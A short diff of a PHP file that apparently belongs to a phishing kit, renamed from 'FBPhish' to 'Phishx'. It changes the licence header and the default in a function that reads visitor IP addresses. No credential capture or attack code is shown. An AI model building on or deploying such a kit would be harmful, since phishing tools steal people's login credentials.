@@ -1,7 +1,7 @@
 <?php
 /*
-FBPhish
-Copyright (C) 2016  Jamie4224
+Phishx
+Copyright (c) 2016 Jamie4224
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -30,7 +30,7 @@ if(!function_exists("getIp")){
 
 if(!function_exists("getMetaIp")){
 	function getMetaIp() {
-	    $metaIp = $_SERVER['REMOTE_ADDR'];
+		$metaIp = "NULL";
 	    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 	        $metaIp = $_SERVER['HTTP_CLIENT_IP'];
 	    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
